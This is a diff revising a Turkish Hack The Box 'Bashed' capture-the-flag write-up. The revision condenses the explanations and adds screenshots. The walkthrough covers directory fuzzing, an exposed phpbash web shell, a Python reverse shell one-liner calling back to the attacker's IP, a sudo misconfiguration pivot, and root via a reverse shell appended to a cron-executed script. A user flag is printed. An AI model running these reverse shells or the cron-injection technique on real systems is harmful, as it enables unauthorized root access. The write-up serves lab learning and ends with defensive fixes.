@@ -1,102 +1,59 @@
-## Hack The Box — Bashed Writeup
+<img width="1400" height="1138" alt="1_-YPHvrd3pj3L2cUcZWfsKQ" src="https://github.com/user-attachments/assets/acd542e5-df2c-47b6-9eaf-3805447204fd" />
 
-**Zorluk:** Easy
-**İşletim Sistemi:** Linux (Ubuntu)
-**Odak Noktalar:** Web Fuzzing, Exposed Dev Files, Sudo Misconfiguration, Cron-based Privilege Escalation
+### About
 
----
+Bashed is an easy Linux machine focused on web fuzzing and locating exposed development files. After discovering a functional phpbash instance, access is gained as `www-data` and escalated to `scriptmanager` through sudo permissions. As direct crontab access is restricted, root escalation relies on identifying writable scripts executed by a root-owned scheduled task.
 
-### Giriş
-
-Bashed, HTB'nin klasik "easy" seviye Linux kutularından biri ve bana kalırsa yeni başlayanlar için gerçekten öğretici bir makine. Neden mi? Çünkü tek bir büyük zafiyet üzerinden değil, **art arda gelen küçük yapılandırma hatalarının zincirlenmesiyle** root'a ulaşıyoruz: unutulmuş bir geliştirme dizini → tam yetkili bir web shell → gevşek bırakılmış bir sudo kuralı → root tarafından periyodik çalıştırılan, yazılabilir bir script dizini. Aşağıda bu zinciri baştan sona, her adımda **neden o komutu çalıştırdığımı ve arka planda ne olduğunu** anlatarak ilerleteceğim.
-
----
-
-### 1. Keşif (Reconnaissance)
-
-Her pentest'te olduğu gibi işe önce hedefi tanımakla başlıyorum. Amacım basit: hangi portlar açık, arkalarında hangi servisler ve versiyonlar çalışıyor?
+### 1. Keşif
 
 ```bash
 nmap -sS -A -T5 -p- 10.129.51.18
 ```
 
-Full port + `-A` ile OS/versiyon/script taraması. Sonuç net:
+<img width="539" height="382" alt="nmap" src="https://github.com/user-attachments/assets/40befac0-da60-43d5-936e-ec02aacdfc55" />
 
-```
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Arrexel's Development Site
-```
-
-Tek açık port 80, yani tüm saldırı yüzeyimiz web uygulaması. Başlığın "**Development** Site" olması da bana bir ipucu veriyor: geliştirme ortamlarında genellikle production'a göre çok daha gevşek güvenlik pratikleri olur — unutulmuş dosyalar, debug endpoint'leri, test script'leri...
-
----
+Tek açık port 80, arkasında Apache 2.4.18 üzerinde çalışan bir web uygulaması. Sayfa başlığı `Arrexel's Development Site` — saldırı yüzeyi tamamen web katmanına indirgeniyor.
 
 ### 2. Web Enumeration
 
-Siteye tarayıcıdan baktığımda görsel olarak fazla bir şey bulamadım — bu normal, çünkü asıl bilgi çoğu zaman **görünmeyen** dizinlerde saklı. Bu yüzden dizin taramasına geçiyorum:
+<img width="1010" height="555" alt="site1" src="https://github.com/user-attachments/assets/e3fa8a00-7c42-422c-9e70-bd489d7aa505" />
+
+Sayfa içeriği statik ve boş, dizin taramasına geçiliyor:
 
 ```bash
 ffuf -u http://10.129.51.18/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 ```
 
-`ffuf`, `FUZZ` yer tutucusunun bulunduğu yere wordlist'teki her kelimeyi sırayla yerleştirip istek atar ve dönen HTTP durum koduna göre gerçek dizinleri/dosyaları ayıklamamı sağlar. Sonuçlarda dikkatimi çeken birkaç 301 (dizin, yönlendirme var) yanıtı oldu:
+<img width="753" height="263" alt="ffuf" src="https://github.com/user-attachments/assets/fbd2d3d6-e38f-4829-a488-85c56165816a" />
 
-```
-css      [301]
-dev      [301]
-fonts    [301]
-images   [301]
-js       [301]
-php      [301]
-uploads  [301]
-```
+`dev` dizini kontrol ediliyor:
 
-`dev` dizini benim için en kritik sinyal — "development" başlığıyla birleşince, orada muhtemelen production'a hiç girmemesi gereken bir şeyler olduğunu düşündüm. Kontrol ettiğimde:
+<img width="582" height="318" alt="dev" src="https://github.com/user-attachments/assets/d0c2de47-420f-4d38-97e8-8ba569f0c918" />
 
-```
-http://10.129.51.18/dev/phpbash.php
-http://10.129.51.18/dev/phpbash.min.php
-```
+**phpbash**, açık kaynaklı semi-interactive bir PHP web shell — production'da unutulmuş bir geliştirme aracı.
 
-**phpbash**, açık kaynaklı bir semi-interactive PHP web shell'idir — yani birileri (muhtemelen geliştirme/test amacıyla) bu aracı sunucuya bırakmış ve **kaldırmayı unutmuş**. Bu tür "unutulmuş araçlar", gerçek dünyada da en çok karşılaşılan foothold (ilk erişim) senaryolarından biridir.
+### 3. Foothold
 
----
-
-### 3. Foothold — www-data Olarak Komut Çalıştırma
-
-`phpbash.php` sayfasını açtığımda, tarayıcı üzerinden doğrudan komut çalıştırabildiğim bir shell arayüzü karşıladı beni. Bu aslında bir **Remote Code Execution (RCE)** — sadece hazır bir araç şeklinde paketlenmiş hali. Hızlıca kimliğimi ve ortamı kontrol ettim:
+`phpbash.php`, tarayıcı üzerinden doğrudan komut çalıştırma imkânı veriyor — paketlenmiş bir RCE.
 
 ```
 www-data@bashed:/home/arrexel# cat user.txt
 efd6cb94fd86d921ba0cb64f733e6a46
 ```
 
-İlk flag'i aldım. Ama phpbash üzerinden çalışmak pratik değil — sayfa her istekte yeniden yükleniyor, komut geçmişi yok, `cd` gibi state gerektiren işlemler garip davranabiliyor. Bu yüzden ilk işim, kendi makineme **tam interaktif bir reverse shell** almak oldu.
+<img width="665" height="152" alt="userflag" src="https://github.com/user-attachments/assets/d590441a-5397-4b97-84c9-f31589e7e9be" />
 
-#### Reverse Shell Nedir, Neden Kullandım?
-
-İki tür shell yaklaşımı vardır:
-
-* **Bind shell:** Hedef makine bir port açar, ben o porta bağlanırım.
-* **Reverse shell:** Hedef makine, **benim dinlediğim** bir porta kendisi bağlanır.
-
-Gerçek dünyada hedefler genellikle firewall/NAT arkasındadır ve dışarıdan içeriye gelen bağlantıları (inbound) engellerler ama içeriden dışarıya giden (outbound) bağlantılara çoğu zaman izin verirler. Bu yüzden reverse shell, pratikte çok daha güvenilir bir yöntemdir — ben de bu mantıkla ilerledim.
-
-Önce kendi makinemde bir dinleyici açtım:
+phpbash state tutmadığı ve her istekte sayfayı yenilediği için, çalışmayı terminale taşımak adına klasik bir Python reverse shell tetikleniyor:
 
 ```bash
 rlwrap nc -nvlp 4444
 ```
 
-Sonra phpbash üzerinden şu Python one-liner'ı çalıştırdım:
-
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-Standart soket bağlantısı + `dup2` ile fd 0/1/2'nin socket'e yönlendirilmesi, klasik payload — burada asıl dikkat ettiğim nokta payload'ın kendisi değil, **neden bind shell değil de reverse shell tercih ettiğim**: hedef muhtemelen NAT/firewall arkasında, outbound bağlantılara inbound'dan çok daha toleranslı — bu yüzden bağlantıyı hedefin bana kurmasını sağlamak, dışarıdan içeri port açmaya çalışmaktan çok daha güvenilir.
-
-Sonuç olarak dinleyicimde bağlantı düştü:
+Bind shell yerine reverse shell tercih edilmesinin sebebi, hedefin muhtemelen firewall/NAT arkasında olması — outbound bağlantılar inbound'a göre çok daha az kısıtlanır.
 
 ```
 connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 46020
@@ -104,20 +61,14 @@ connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 46020
 $
 ```
 
-PTY olmayan yarım bir shell — bu box için yeterli, upgrade etmedim.
-
 ---
 
-### 4. Privilege Escalation — www-data'dan scriptmanager'a
-
-Shell'im artık daha kullanışlı, sıradaki adım klasik: **hangi yetkilerle neler yapabiliyorum?**
+### 4. Privilege Escalation — www-data → scriptmanager
 
 ```
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-
-Standart bir web sunucusu kullanıcısıyız, özel bir grup üyeliğimiz yok. Bu noktada her zaman kontrol ettiğim ilk şeylerden biri sudo yetkileridir — çünkü çoğu zaman servis hesapları, farkında olmadan geniş sudo izinleriyle bırakılır:
 
 ```
 $ sudo -l
@@ -125,51 +76,45 @@ User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
-Bu satır altın değerinde. Anlamı şu: `www-data` kullanıcısı, **hiçbir şifre girmeden**, `scriptmanager` kullanıcısı kimliğiyle **istediği herhangi bir komutu** çalıştırabilir. Bu, klasik bir "aşırı geniş sudo kuralı" (sudo misconfiguration) örneği — güvenlik ekibi muhtemelen "belirli bir script'i çalıştırabilsin" demek isterken, `ALL` yazarak kapıyı sonuna kadar açık bırakmış.
+`www-data`, şifre girmeden `scriptmanager` kimliğiyle **herhangi bir komutu** çalıştırabiliyor — kural muhtemelen tek bir script'e izin vermek amacıyla yazılmış, `ALL` ile kapsam tamamen genişletilmiş. Klasik bir sudo misconfiguration.
 
 ```bash
 sudo -u scriptmanager /bin/bash
 ```
 
-`-u scriptmanager` parametresi, komutu hangi kullanıcı kimliğiyle çalıştıracağımı belirtir. Bu komutla artık `scriptmanager` kullanıcısı olarak tam bir bash shell'e sahibim — root değilim ama önemli bir yatay/dikey geçiş yaptım.
+### 5. Privilege Escalation — scriptmanager → root
 
----
-
-### 5. Privilege Escalation — scriptmanager'dan root'a
-
-`scriptmanager` olarak etrafı incelerken dikkatimi çeken bir dizin vardı:
+`scriptmanager` context'inde dikkat çeken nokta, kullanıcıya özel bir dizin:
 
 ```
 $ ls -ld /scripts
 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun  2  2022 /scripts
 ```
 
-`www-data` iken bu dizine giremiyordum (`Permission denied`), çünkü izinler sadece `scriptmanager` kullanıcısına ve grubuna yazma/okuma hakkı veriyordu. Ama artık `scriptmanager`'ım, yani bu dizin bana açık.
+`www-data` iken bu dizine erişim `Permission denied` ile reddediliyordu; izinler sadece `scriptmanager` sahipliği/grubuna yazma-okuma hakkı tanıyor. `sudo -l` çıktısındaki `NOPASSWD: ALL` doğrudan crontab'a erişim vermiyor — root'un crontab'ını göremiyoruz. Ama isim seçimi (`scriptmanager` + `/scripts`) tek başına güçlü bir sinyal: bu paternde neredeyse her zaman root'a ait bir cron job, bu dizini periyodik tarayıp içindeki dosyaları kendi yetkisiyle çalıştırır. Crontab'a doğrudan erişim yoksa bu, genelde `pspy` ile (root yetkisi gerektirmeden çalışan process'leri gözlemleyen bir araç) doğrulanır; Bashed'de senaryo tam olarak bu — `/scripts` altındaki `.py` dosyaları root cron job'u tarafından düzenli aralıklarla execute ediliyor.
 
-Burada önemli bir ipucu daha var, biraz da tecrübeyle fark edilen bir şey: **böyle "scriptmanager" adında özel bir kullanıcı ve ona ait bir `/scripts` dizini varsa, arkada büyük ihtimalle bir cron job bu dizini periyodik olarak tarayıp içindeki script'leri root yetkisiyle çalıştırıyordur.** Bu tür kutularda genelde `pspy` gibi bir araçla (root yetkisi olmadan çalışan process'leri gözlemleyen bir tool) crontab'ı doğrudan görmeden de hangi process'lerin periyodik çalıştığını tespit edebilirsiniz. Bashed'de tam olarak bu senaryo geçerli: sistemde root'a ait bir cron job, `/scripts` dizinindeki `.py` uzantılı dosyaları düzenli aralıklarla **root yetkisiyle** çalıştırıyor.
+Zincir şu şekilde tamamlanıyor:
 
-Yani mantık zinciri şöyle tamamlanıyor:
+1. `/scripts`, `scriptmanager` tarafından yazılabilir.
+2. Root, bu dizindeki script'leri periyodik olarak kendi yetkisiyle çalıştırıyor.
+3. `scriptmanager` context'i bu dizine dosya yazmaya yetiyor.
+4. **Sonuç:** Buraya bırakılan herhangi bir kod, root tarafından root yetkisiyle execute edilir — klasik *writable path + privileged scheduled execution* kombinasyonu.
 
-1. `/scripts` dizini `scriptmanager` kullanıcısına yazılabilir.
-2. Root, arka planda periyodik olarak bu dizindeki script'leri kendi yetkisiyle çalıştırıyor.
-3. Ben `scriptmanager` olarak bu dizine dosya yazabiliyorum.
-4. **Sonuç:** Buraya kendi reverse shell kodumu yazarsam, root bunu benim için, kendi yetkisiyle çalıştırır.
-
-Bunu doğrulamak/istismar etmek için önce ikinci bir netcat dinleyici açtım (ilk shell'im hâlâ açık kalsın istedim, olası bir sorunda kaybetmemek için):
+İkinci bir listener açılıyor (ilk shell korunuyor):
 
 ```bash
 rlwrap nc -nvlp 4445
 ```
 
-Sonra `scriptmanager` shell'imden, `/scripts` dizinine yeni bir Python dosyası oluşturup içine aynı mantıkla çalışan bir reverse shell kodu yazdım:
+`/scripts` dizinine yeni bir payload yazılıyor:
 
 ```bash
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /scripts/test.py
 ```
 
-Burada `echo ... >> /scripts/test.py` komutunu kullanmamın nedeni basit: elimde bir metin editörü açma lüksü yok (ya da açmak istemedim), bu yüzden `echo` ile string'i doğrudan dosyaya **ekliyorum** (`>>` — üzerine yazmak yerine sona ekler; `test.py` yoksa oluşturur). İçerik, bir önceki bölümde detaylıca açıkladığım **aynı reverse shell mantığı** — sadece bu sefer IP aynı ama port `4445`, çünkü ilk shell'imle karışmasın istedim.
+Port `4444`'ten farklı seçildi (`4445`), aktif ilk shell ile karışmasın diye. `echo ... >>` tercih edilmesinin nedeni pratik: elde interaktif bir editör olmadan dosyayı doğrudan oluşturup içeriği tek satırda yazmak.
 
-Kodu yazdıktan sonra tek yapmam gereken **beklemekti** — cron job'un bir sonraki çalışma zamanını bekledim (genelde bu tür kutularda 1 dakikayı geçmez). Ve az sonra ikinci dinleyicimde bağlantı düştü:
+Cron'un bir sonraki tetiklenmesi (tipik olarak ≤1 dakika) bekleniyor:
 
 ```
 connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 35430
@@ -178,7 +123,7 @@ connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 35430
 root
 ```
 
-`test.py` script'i root'un cron job'u tarafından **root yetkisiyle** çalıştırıldı ve içindeki reverse shell kodu tetiklendi — az önce `scriptmanager` olarak yazdığım dosya, bir dakika içinde bana root shell olarak geri döndü. Kalan iş formaliteydi:
+`test.py`, root'un cron job'u tarafından root yetkisiyle çalıştırıldı ve içindeki reverse shell payload'ı tetiklendi.
 
 ```
 # cd /root
@@ -188,15 +133,6 @@ root
 
 ---
 
-### Özet ve Çıkarımlar
+### Özet
 
-Bu makine, tek başına "kritik" bir CVE barındırmıyor — ama gerçek dünyada sistemleri gerçekten çökerten şeyin de genelde tam olarak bu olduğunu gösteriyor: **birbirine küçük küçük görünen yapılandırma hataları, art arda geldiğinde tam bir zincir oluşturuyor.**
-
-Zincirdeki her adımı ve "bu neden oldu" sorusunu kısaca özetleyeyim:
-
-1. **Unutulmuş geliştirme dosyası (phpbash):** Development ortamında kullanılan bir debug/test aracının production'a taşınıp temizlenmemesi → doğrudan RCE.
-2. **Aşırı geniş sudo kuralı (`NOPASSWD: ALL`):** "Bu kullanıcı sadece belirli bir script'i çalıştırabilsin" niyetiyle yazılmış olması muhtemel kural, `ALL` ile sınırsız hale gelmiş.
-3. **Root'un kontrolsüz çalıştırdığı cron job:** Root yetkisiyle çalışan bir zamanlanmış görevin, düşük yetkili bir kullanıcı tarafından **yazılabilir** bir dizini taraması — klasik "writable path + privileged execution" kombinasyonu.
-
-Savunma tarafında bakılırsa üç basit önlem bu zinciri en baştan kırardı: geliştirme araçlarının production dağıtımından **CI/CD seviyesinde** hariç tutulması, sudo kurallarının komut bazında **en az yetki (least privilege)** prensibiyle daraltılması ve root tarafından çalıştırılan her script/dizinin **sahiplik ve yazma izinlerinin** düzenli denetlenmesi.
-
+Zincir üç yapılandırma hatasının üst üste gelmesinden oluşuyor: production'da unutulmuş bir debug web shell (phpbash) doğrudan RCE veriyor; `sudo -l` çıktısındaki `NOPASSWD: ALL` kuralı `scriptmanager`'a sınırsız komut çalıştırma yetkisi tanıyor; ve root'a ait bir cron job, düşük yetkili bir kullanıcı tarafından yazılabilir bir dizini (`/scripts`) kontrolsüzce execute ediyor. Kalıcı çözüm: geliştirme araçlarının CI/CD seviyesinde production'dan hariç tutulması, sudo kurallarının komut bazında en az yetkiyle (`Cmnd_Alias` + spesifik path) sınırlandırılması, ve root tarafından çalıştırılan her cron script'inin sahiplik/yazma izinlerinin düzenli denetlenmesi.
